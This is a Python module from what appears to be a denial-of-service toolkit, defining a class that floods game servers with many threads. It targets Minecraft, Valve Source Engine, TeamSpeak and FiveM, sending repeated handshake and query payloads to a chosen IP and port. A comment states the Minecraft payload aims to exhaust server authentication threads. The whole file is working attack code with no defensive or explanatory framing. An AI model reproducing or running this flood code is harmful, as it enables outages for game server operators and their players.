import socket
import random
import time
import threading
from core.colors import log_info, log_success, log_warning, log_danger

class GamingProtocols:
    def __init__(self, target_ip, target_port, threads=100, time=300):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.time = time

    def minecraft_worker(self):
        end_time = time.time() + self.time
        # Minecraft handshake and login payload to exhaust server auth threads
        payload = b'\\x0f\\x00\\x2f\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\xdd\\xd5\\x01\\x01\\x00'
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                s.send(payload)
                s.close()
            except Exception:
                pass

    def source_engine_worker(self):
        end_time = time.time() + self.time
        # Valve Source Engine query payload (A2S_INFO)
        payload = b'\\xff\\xff\\xff\\xffTSource Engine Query\\x00'
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception:
            return

        while time.time() < end_time:
            try:
                s.sendto(payload, (self.target_ip, self.target_port))
            except Exception:
                pass

    def teamspeak_worker(self):
        end_time = time.time() + self.time
        # TS3 Status query payload
        payload = b'\\x54\\x53\\x33\\x49\\x4e\\x49\\x54\\x31\\x00\\x65\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception:
            return

        while time.time() < end_time:
            try:
                s.sendto(payload, (self.target_ip, self.target_port))
            except Exception:
                pass

    def fivem_worker(self):
        end_time = time.time() + self.time
        # FiveM getinfo payload
        payload = b'\\xff\\xff\\xff\\xffgetinfo xxx'
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception:
            return

        while time.time() < end_time:
            try:
                s.sendto(payload, (self.target_ip, self.target_port))
            except Exception:
                pass

    def run_method(self, method="MINECRAFT"):
        log_info(f"Starting Gaming Protocol ({method}) Flood on {self.target_ip}:{self.target_port} with {self.threads} threads...")
        threads = []
        target_func = None
        
        if method == "MINECRAFT": target_func = self.minecraft_worker
        elif method == "SOURCE": target_func = self.source_engine_worker
        elif method == "TEAMSPEAK": target_func = self.teamspeak_worker
        elif method == "FIVEM": target_func = self.fivem_worker
        
        if target_func:
            for _ in range(self.threads):
                t = threading.Thread(target=target_func)
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            log_success(f"{method} Flood Finished.")
